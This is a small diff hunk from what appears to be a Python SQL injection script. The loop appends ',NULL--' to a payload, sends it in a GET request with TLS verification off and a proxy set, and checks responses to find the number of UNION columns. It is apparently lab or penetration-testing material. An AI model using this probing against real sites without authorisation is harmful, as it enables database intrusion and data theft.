@@ -79,8 +79,7 @@ if __name__ == "__main__":
 
   for i in range(1, 10):  
     if i > 1:  
-      payload = payload.replace('--', '')  
-      payload += ",NULL--"  
+      payload = payload.replace('--', ',NULL--')    
     r = requests.get(url + path + payload, verify=False, proxies=proxies)  
     res = r.text  
     if "Internal Server Error" not in res:  
